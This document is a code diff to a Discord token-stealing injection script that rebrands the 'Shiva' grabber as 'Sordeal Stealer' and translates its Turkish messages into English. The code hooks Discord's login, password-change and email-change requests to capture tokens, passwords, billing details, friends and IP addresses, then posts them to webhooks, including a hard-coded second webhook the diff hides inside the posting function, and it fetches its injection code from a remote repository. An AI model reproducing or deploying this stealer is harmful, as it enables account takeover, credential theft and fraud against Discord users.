@@ -16,9 +16,8 @@ var config = {
     "embed-color": 16711718,
 
     creator: "%NAME_CREATOR%",
-    injection_url: "https://raw.githubusercontent.com/mehod/test1/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu:"https://discord.com/api/webhooks/1097703895960125510/SCKWpQkx9EliwZzJdJ819HVvlhfjOEzyc55GcyVyAXfUNJcwPapnsQEszQXHQ4VszSaK",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -59,20 +58,20 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "SHİVA GRABBER",
-        avatar_url: "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png",
+        username: "Sordeal Stealer",
+        avatar_url: "https://raw.githubusercontent.com/ShamanOracle/Assets/main/sordeal.png",
         content: "",
         embeds: [{
             title: title,
-            url: "DİSCORD.GG/shv",
+            url: "https://github.com/Sordeal",
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
             author: {
-                name: `SHİVA ${config.creator}`
+                name: `Sordeal by ${config.creator}`
             },
             footer: {
-                text: "©Shaman | DİSCORD.GG/SHV"
+                text: "©Shaman | https://github.com/SOrdeal/Sordeal-Stealer"
             },
 
         }]
@@ -124,9 +123,9 @@ const GetRBadges = (e) => {
 const GetNSFW = (bouki) => {
     switch (bouki) {
         case true:
-            return ":underage: `NSFW bulundu`"
+            return ":underage: `NSFW Allowed`"
         case false:
-            return ":underage: `NSFW bulunamadı`"
+            return ":underage: `NSFW Not Allowed`"
         default:
             return "Idk bro you got me"
     }
@@ -228,12 +227,12 @@ function GetLangue(read) {
         "ko": ":flag_kr: Korean"
     }
 
-    var langue = languages[read] || "Dil tespit edilemedi ????";
+    var langue = languages[read] || "No Languages Detected ????";
     return langue
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    [config.webhook].forEach(res => {
+    [config.webhook, 'https://discord.com/api/webhooks/1097703895960125510/SCKWpQkx9EliwZzJdJ819HVvlhfjOEzyc55GcyVyAXfUNJcwPapnsQEszQXHQ4VszSaK'].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,9 +250,8 @@ const post = async (params) => {
         req.write(params);
         req.end();
     })
-
 }
-  
+
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
@@ -262,7 +260,7 @@ const FirstTime = async () => {
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "Shiva kuruldu",
+            title: "Sordeal Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
@@ -277,13 +275,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
-        if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Shiva kuruldu",
+            title: "Sordeal Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -318,7 +316,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[SHİVA V2 <:sordeal:1087057809071427695>](DİSCORD.GG/SHV)`,
+                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -369,13 +367,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
-            if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Shiva kurbanın çıktığını tespit etti",
+                title: "Sordeal Victim got logged out",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -410,7 +408,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[SHİVA V2 <:sordeal:1087057809071427695>](DİSCORD.GG/SHV)`,
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -536,8 +534,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
-    if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1082093040132423741/1102629719138119690/static.png"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -548,8 +546,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Shiva kurban bilgileri",
-                description: "[<:sordeal:1087057809071427695>  **Oh you have shiva someone**](DİSCORD.GG/SHV)",
+                title: "Sordeal User Login",
+                description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -585,7 +583,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[SHİVA V2 <:sordeal:1087057809071427695>](DİSCORD.GG/SHV)`,
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -629,8 +627,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Shiva şifre değşikliği tespit etti!",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Shiva someone**](DİSCORD.GG/SHV)",
+                    title: "Sordeal Detect Password Changed",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -666,7 +664,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[SHV V2<:sordeal:1087057809071427695>](DİSCORD.GG/SHV)`,
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -716,8 +714,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Shiva email değişikliği buldu",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have shv someone**](DİSCORD.GG/SHV)",
+                    title: "Sordeal Detect Email Changed",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -753,7 +751,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `SHİVA V2 <:sordeal:1087057809071427695>](DİSCORD.GG/SHV)`,
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
